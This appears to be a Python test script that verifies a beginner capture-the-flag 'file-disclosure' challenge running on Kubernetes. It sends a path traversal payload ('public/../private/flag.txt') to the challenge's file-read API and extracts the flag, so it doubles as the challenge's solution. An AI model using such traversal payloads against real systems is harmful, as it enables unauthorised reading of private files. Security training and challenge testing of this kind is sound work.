#!/usr/bin/env python3
"""
Test module for file-disclosure challenge
"""

import requests
from typing import Optional
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils import TestResult, check_service_health, extract_flag_from_response, validate_flag_format, wait_for_service, check_namespace_exists, check_service_exists


def test_file_disclosure_challenge(base_url: Optional[str] = None, verbose: bool = False) -> TestResult:
    """Test the file-disclosure challenge vulnerability"""
    result = TestResult("File Disclosure Challenge")
    
    # Determine URL
    if not base_url:
        if verbose:
            print("  Checking if namespace exists...")
        if not check_namespace_exists('file-disclosure'):
            result.failure("Namespace 'file-disclosure' does not exist. Deploy the challenge first using: kubectl apply -f challenges/beginner/file-disclosure/")
            return result
        
        if verbose:
            print("  Checking if service exists...")
        if not check_service_exists('file-disclosure', 'file-disclosure'):
            result.failure("Service 'file-disclosure' does not exist in namespace 'file-disclosure'. Deploy the challenge first.")
            return result
        
        if verbose:
            print("  Waiting for service NodePort...")
        port = wait_for_service('file-disclosure', 'file-disclosure')
        if not port:
            result.failure("Could not get service NodePort. The service may not be ready yet. Try: kubectl get svc -n file-disclosure")
            result.details['namespace_exists'] = check_namespace_exists('file-disclosure')
            result.details['service_exists'] = check_service_exists('file-disclosure', 'file-disclosure')
            return result
        base_url = f"http://localhost:{port}"
    
    # Check service health with retries (pods might still be starting)
    if verbose:
        print("  Checking service health...")
    
    # Try to get pod status for diagnostics
    pod_status = None
    try:
        import subprocess
        proc = subprocess.run(
            ['kubectl', 'get', 'pods', '-n', 'file-disclosure', '-l', 'app=file-disclosure', '-o', 'jsonpath={.items[0].status.phase}'],
            capture_output=True,
            text=True,
            timeout=5
        )
        if proc.returncode == 0:
            pod_status = proc.stdout.strip()
    except Exception:
        pass
    
    is_healthy, health_error = check_service_health(base_url, timeout=10, retries=5, retry_delay=3)
    if not is_healthy:
        error_msg = f"Service not healthy at {base_url} after multiple attempts."
        if pod_status:
            error_msg += f" Pod status: {pod_status}"
        if health_error:
            error_msg += f" Connection error: {health_error}"
        
        result.failure(error_msg)
        result.details['base_url'] = base_url
        result.details['pod_status'] = pod_status or "unknown"
        result.details['health_error'] = health_error
        result.details['suggestion'] = "Try: kubectl get pods -n file-disclosure && kubectl logs -n file-disclosure -l app=file-disclosure"
        return result
    
    try:
        # Test path traversal vulnerability
        # The app checks for "public/" prefix but allows "../" after it
        vulnerable_path = "public/../private/flag.txt"
        
        response = requests.get(
            f"{base_url}/api/read",
            params={'file': vulnerable_path},
            timeout=10
        )
        
        if response.status_code != 200:
            result.failure(f"Path traversal failed with status {response.status_code}. Response: {response.text[:200]}")
            result.details['status_code'] = response.status_code
            result.details['response'] = response.text[:500]
            return result
        
        # Extract flag from response
        flag = extract_flag_from_response(response)
        
        if not flag:
            # Try parsing JSON directly
            try:
                data = response.json()
                if 'content' in data:
                    content = data['content']
                    # Flag should be in the file content
                    if 'FLAG{' in content:
                        import re
                        match = re.search(r'FLAG\{[^}]+\}', content)
                        if match:
                            flag = match.group(0)
            except Exception:
                pass
        
        if not flag:
            result.failure("Flag not found in response")
            result.details['response'] = response.text[:500]
            return result
        
        # Validate flag format
        if not validate_flag_format(flag):
            result.failure(f"Invalid flag format: {flag}")
            return result
        
        result.success(f"Successfully exploited path traversal vulnerability", flag)
        result.details['exploited_path'] = vulnerable_path
        result.details['response_data'] = response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text[:500]
        return result
        
    except Exception as e:
        result.failure(f"Error during test: {str(e)}")
        import traceback
        result.details['traceback'] = traceback.format_exc()
        return result


if __name__ == '__main__':
    # Allow direct execution for testing
    result = test_file_disclosure_challenge()
    print(result)

